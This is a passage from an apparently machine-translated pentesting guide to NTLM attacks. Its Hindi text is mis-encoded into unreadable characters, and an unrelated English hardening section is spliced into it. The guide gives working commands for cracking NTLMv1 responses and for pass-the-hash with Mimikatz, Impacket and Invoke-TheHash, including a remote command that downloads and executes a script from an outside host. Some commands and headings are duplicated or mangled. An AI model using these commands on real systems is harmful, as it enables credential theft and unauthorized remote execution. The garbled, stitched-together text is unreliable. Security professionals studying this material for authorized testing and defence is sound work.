рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ **рд▓рдВрдмрд╛ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд╢рдмреНрджрдХреЛрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд░реИрдХ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ DES рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рдХреНрд░реИрдХ рдХрд░ рд╕рдХреЗрдВрдЧреЗ (рдЖрдк [https://crack.sh/](https://crack.sh) рдпрд╛ [https://ntlmv1.com/](https://ntlmv1.com) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХ
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрдЧрд╛:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM

## NTLM Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for authentication purposes.

## NTLM Weaknesses

NTLM has several weaknesses that make it vulnerable to attacks, including:

- **Pass-the-Hash**: Attackers can use the hash of a user's password to authenticate as that user without knowing the actual password.
- **Pass-the-Ticket**: Attackers can use stolen ticket-granting tickets to authenticate to services.
- **Relay Attacks**: Attackers can relay authentication attempts to gain unauthorized access.

## NTLM Hardening

To mitigate the weaknesses of NTLM, consider implementing the following security measures:

- **Disable NTLM**: Whenever possible, disable NTLM authentication in favor of more secure protocols like Kerberos.
- **Enforce Complex Passwords**: Require users to use complex and unique passwords to make pass-the-hash attacks more difficult.
- **Enable SMB Signing**: Require SMB signing to protect against relay attacks.
- **Enable LDAP Signing**: Require LDAP signing to protect against man-in-the-middle attacks.

By implementing these hardening measures, you can improve the security of your Windows environment and reduce the risk of NTLM-related attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
рд╡рд┐рддрд░рд┐рдд рд╣реИрд╢рдХреИрдЯ (hashtopolis рдЬреИрд╕реЗ рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡реЛрддреНрддрдо) рдЪрд▓рд╛рдПрдВ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ рдпрд╣ рдХрдИ рджрд┐рди рд▓реЗ рд╕рдХрддрд╛ рд╣реИред
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реИ рдХрд┐ 'рдкрд╛рд╕рд╡рд░реНрдб' рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЗрдореЛ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдВрдЧреЗ:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
рд╣рдореЗрдВ рдЕрдм hashcat-utilities рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдХреНрд░реИрдХ рдХрд┐рдП рдЧрдП des рдХреБрдВрдЬреА рдХреЛ NTLM рд╣реИрд╢ рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
рдЕрдВрдд рдореЗрдВ рдЖрдЦрд┐рд░рдХрд╛рд░ рдЖрдЦрд┐рд░реА рднрд╛рдЧ:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM рд╡рд┐рд╢реЗрд╖рдЬреНрдЮрддрд╛

рдпрд╣ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮрддрд╛ NTLM рд╣реИрдВрдбрд╢реЗрдХреНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ NTLM рд╣реИрдВрдбрд╢реЗрдХреНрд╕ рдХреЛ рдЕрджреНрд╡рд┐рддреАрдпрддрд╛ рдФрд░ рдЕрджреНрд╡рд┐рддреАрдпрддрд╛ рдХреЗ рд╕рд╛рде рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ NTLM рд╣реИрдВрдбрд╢реЗрдХреНрд╕ рдХреЛ рдЕрджреНрд╡рд┐рддреАрдпрддрд╛ рдФрд░ рдЕрджреНрд╡рд┐рддреАрдпрддрд╛ рдХреЗ рд╕рд╛рде рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**рдЪреБрдиреМрддреА рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ рд╣реИ** рдФрд░ **2 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИрдВ**: рдПрдХ **24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИ рдФрд░ **рджреВрд╕рд░реА** рдХреА рд▓рдВрдмрд╛рдИ **рд╡рд┐рд╡рд┐рдз** рд╣реИред

**рдкрд╣рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рдбреЛрдореЗрди** рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдиреА **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ рдФрд░ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ **NT рд╣реИрд╢** рдХрд╛ **рд╣реИрд╢ MD4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, **рдкрд░рд┐рдгрд╛рдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреБрдВрдЬреА** рдХреЛ рдЪрд┐рдкрдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдореЗрдВ, **8 рдмрд╛рдЗрдЯ рдХрд╛ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреБрдиреМрддреА рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрд▓: 24 рдмреАред

**рджреВрд╕рд░реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХрдИ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдПрдХ рдирдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреБрдиреМрддреА, рдПрдХ **рд╕рдордп-рдЪрд┐рд╣реНрди** рдХреЛ **рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╣рдорд▓реЛрдВ** рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП...)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **pcap рд╣реИ рдЬрд┐рд╕рдиреЗ рдПрдХ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдбреЛрдореЗрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рддреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдПрдХ **рдЙрдкрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ **рдЙрд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░реЗрдЧрд╛**, **рдпрд╛** рдЖрдк рдПрдХ рдирдпрд╛ **рд╕рддреНрд░рд▓реЙрдЧрдСрди** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **LSASS** рдореЗрдВ рдЙрд╕ **рд╣реИрд╢** рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЬрдм рднреА рдХреЛрдИ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ **рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред** рдЖрдЦрд┐рд░реА рд╡рд┐рдХрд▓реНрдк рд╣реИ рд╡рд╣ рдХреНрдпрд╛ рдХрд░рддрд╛ рд╣реИред

**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдкрд╛рд╕-рдж-рд╣реИрд╢ рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Mimikatz**

**рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдо рдкрд░ рд╣реЛрдЧреА рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдорд┐рдореАрдХреИрдЯреНрдЬ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди LSASS рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдорд┐рдореАрдХреИрдЯреНрдЬ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрдВрдЧреЗред рдлрд┐рд░, рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛ (рдЬреИрд╕реЗ `runas /netonly` рдЯреНрд░рд┐рдХ, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ plain-text рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)ред

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Windows рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░реЗрдВ рд╕реАрдЦреЗрдВред**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows рдХрдВрдкрд╛рдЗрд▓реНрдб рдЙрдкрдХрд░рдг

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ [Windows рдХреЗ рд▓рд┐рдП Impacket рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)ред

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, cmd.exe рдФрд░ powershell.exe рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* рдХрдИ рдЕрдиреНрдп Impacket рдмрд╛рдЗрдирд░реА рд╣реИрдВ...

### Invoke-TheHash

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдирд╡реЛрдХ-рдбрдмреНрд▓реНрдпреВрдПрдордЖрдИрдЗрдХреНрдЬрд╝реАрдХреНтАНрдпреВрдЯ
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдирд╡реЛрдХ-рдПрд╕рдПрдордмреАрдХреНрд▓рд╛рдЗрдВрдЯ
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### рдЗрдирд╡реЛрдХ-рдПрд╕рдПрдордмреАрдИрдиреБрдо
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рд╕рднреА рдЕрдиреНрдп** рдХрд╛ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдЖрдк **рдХрдИ рд╣реЛрд╕реНрдЯ** рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдХрд┐рд╕реА рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рд╡рд╣ рд╡рд┐рдХрд▓реНрдк рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдХрд╛ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ (_SMBExec, WMIExec, SMBClient, SMBEnum_). рдЕрдЧрд░ рдЖрдк **SMBExec** рдФрд░ **WMIExec** рдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рднреА** рдХреЛ рдЪреБрдирддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк рдХреЛрдИ _**рдХрдорд╛рдВрдб**_ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдмрд╕ **рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВред
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [рдИрд╡рд┐рд▓-рд╡рд┐рдирдЖрд░рдПрдо рдкрд╛рд╕ рдж рд╣реИрд╢](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**

рдпрд╣ рдЙрдкрдХрд░рдг рдорд┐рдореАрдХреЗрдЯреНрдЬрд╝ (LSASS рдореЗрдореЛрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛) рдХреА рддрд░рд╣реА рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### рдореИрдиреБрдЕрд▓ Windows рд░рд┐рдореЛрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдирд╛

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM рд░рд┐рд▓реЗ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

**рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЧрд╛рдЗрдб рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдкрдврд╝реЗрдВ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рд╕реЗ NTLM рдЪреИрд▓реЗрдВрдЬ рдкрд╛рд░реНрд╕ рдХрд░реЗрдВ

**рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
